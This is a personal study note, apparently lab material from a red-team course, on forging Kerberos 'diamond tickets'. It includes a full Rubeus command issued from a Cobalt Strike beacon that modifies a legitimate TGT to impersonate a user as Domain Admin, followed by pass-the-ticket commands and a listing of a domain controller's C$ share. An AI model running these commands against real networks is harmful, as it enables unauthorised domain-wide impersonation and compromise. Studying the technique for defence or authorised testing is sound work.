---
creation date: September 26th 2022
last modified date: September 26th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Diamond Tickets]]  
___

## Description:  
Like a golden ticket, a diamond ticket is a TGT which can be used to access any service as any user.  A golden ticket is forged completely offline, encrypted with the krbtgt hash of that domain, and then passed into a logon session for use.  Because domain controllers don't track TGTs it (or they) have legitimately issued, they will happily accept TGTs that are encrypted with its own krbtgt hash.

A diamond ticket is made by modifying the fields of a legitimate TGT that was issued by a DC.  This is achieved by requesting a TGT, decrypting it with the domain's krbtgt hash, modifying the desired fields of the ticket, then re-encrypting it.


Diamond tickets can be created with Rubeus.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1112 /groups:512 /krbkey:390b2f[...snip...]91a8aa /nowrap
```

Where:

-   `/tgtdeleg` uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
-   `/ticketuser` is the username of the principal to impersonate.
-   `/ticketuserid` is the domain RID of that principal.  This can be obtained using a command like `powershell Get-DomainUser -Identity nlamb -Properties objectsid`.
-   `/groups` are the desired group RIDs (512 being Domain Admins).
-   `/krbkey` is the krbtgt AES256 hash.

And we can leverage it to access a resource such as the domain controller.
```
beacon> make_token DEV\nlamb FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\nlamb.kirbi

beacon> ls \\dc-2\c$
[*] Listing: \\dc-2\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 11:11:35   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 16:37:14   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     03/01/2022 16:34:27   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     03/25/2021 10:23:35   Shares
          dir     02/19/2021 11:49:20   System Volume Information
          dir     03/01/2022 10:51:31   Users
          dir     03/01/2022 13:14:40   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 704mb    fil     07/07/2022 08:25:04   pagefile.sys
```




___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 26th 2022 (12:35 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
